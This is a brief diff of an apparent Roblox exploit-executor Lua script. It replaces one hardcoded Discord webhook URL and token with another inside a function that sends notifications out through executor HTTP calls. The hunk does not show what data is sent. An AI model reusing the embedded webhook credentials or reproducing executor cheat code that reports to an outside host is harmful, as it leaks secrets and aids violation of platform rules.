@@ -26,7 +26,7 @@ end
 JoinTeam()
 
 -- Webhook setup
-local webhook = "https://discord.com/api/webhooks/1355686213662802110/Zb2ToOaLRgzBq33aMO3Z4pAEId-d68akqQwwKQagx092AziDLneZYTgw9rOsHRbWdWTi"
+local webhook = "https://discord.com/api/webhooks/1360740986665304085/XH5HCpocF3p0CqScrBjUbDuBo9Qe4VHbDgEkEXdfGUuTeRiR7oxDg-EnI8sjxv3l-Qr_"
 local function sendWebhook(title, desc)
     task.spawn(function()
         (syn and syn.request or fluxus and fluxus.request or fluxus_request or http and http.request or http_request)({
